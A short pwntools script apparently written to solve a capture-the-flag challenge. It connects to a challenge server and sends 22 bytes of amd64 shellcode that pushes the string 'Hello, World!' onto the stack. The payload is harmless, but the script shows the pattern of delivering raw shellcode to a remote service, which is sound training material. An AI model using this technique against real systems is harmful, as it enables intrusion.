#!/usr/bin/env python3
from pwn import *

# Connect to the remote service.
io = remote("shelltwo.pwn.ccit25.chals.havce.it", 1338)

context.arch = 'amd64'

# rax = "orld!\x00\x00" (padded)
# push second half onto stack
# rax = "Hello, W"
# push first half so that it sits at RSP

shellcode = asm('''
    mov rax, 0x00000021646c726f   
    push rax                     
    mov rax, 0x57202c6f6c6c6548   
    push rax                     
''')

# Optional: print the disassembled code for verification.
io.recvuntil(b"here: ")
print(disasm(shellcode))

# Send the 22-byte shellcode to the challenge.
io.sendline(shellcode)

# Interact with the shell or service.
io.interactive()
